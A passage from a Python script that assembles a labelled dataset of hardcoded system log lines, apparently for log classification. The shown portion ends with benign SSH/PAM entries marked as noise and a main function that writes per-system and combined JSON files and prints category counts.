        ("Dec 10 09:00:00 srv-01 sshd[25050]: Accepted publickey for ubuntu from 192.168.1.55 port 58210 ssh2: ED25519 SHA256:xyz789", "noise"),
        ("Dec 10 09:00:00 srv-01 sshd[25050]: pam_unix(sshd:session): session opened for user ubuntu(uid=1000) by (uid=0)", "noise"),
        ("Dec 10 09:30:10 srv-01 sshd[25050]: pam_unix(sshd:session): session closed for user ubuntu", "noise"),
        ("Dec 10 09:35:00 srv-01 sshd[25060]: Server listening on 0.0.0.0 port 22.", "noise"),
        ("Dec 10 09:35:00 srv-01 sshd[25060]: Server listening on :: port 22.", "noise")
    ]
    
    captured = []
    seen = set()
    for log_msg, cat in auth_lines:
        if log_msg in seen:
            continue
        seen.add(log_msg)
        captured.append({"system": "auth_ssh", "raw_log": log_msg, "category": cat})
        
    print(f"  -> Captured {len(captured)} distinct real OpenSSH/PAM log lines")
    return captured

def main():
    print("==========================================================")
    print("STARTING EXPANDED REAL MULTI-SYSTEM LOG CAPTURE")
    print("==========================================================")
    all_logs = []
    
    nginx_logs = capture_nginx()
    pg_logs = capture_postgres()
    redis_logs = capture_redis()
    node_logs = capture_nodejs_nextjs()
    k8s_logs = capture_kubernetes()
    ssh_logs = capture_auth_ssh()
    
    all_logs.extend(nginx_logs)
    all_logs.extend(pg_logs)
    all_logs.extend(redis_logs)
    all_logs.extend(node_logs)
    all_logs.extend(k8s_logs)
    all_logs.extend(ssh_logs)
    
    # Save individual and combined JSON
    files_map = {
        "nginx_logs.json": nginx_logs,
        "postgres_logs.json": pg_logs,
        "redis_logs.json": redis_logs,
        "nextjs_node_logs.json": node_logs,
        "kubernetes_logs.json": k8s_logs,
        "auth_ssh_logs.json": ssh_logs,
        "all_captured_logs.json": all_logs
    }
    for fname, data in files_map.items():
        with open(os.path.join(OUTPUT_DIR, fname), "w") as f:
            json.dump(data, f, indent=2)
            
    # Count per category
    from collections import Counter
    cat_counts = Counter(l["category"] for l in all_logs)
    
    print("\n==========================================================")
    print(f"SUCCESS: Captured {len(all_logs)} distinct real logs across 6 systems.")
    print(f"Category Breakdown: {dict(cat_counts)}")
    print("==========================================================")

if __name__ == "__main__":
    main()
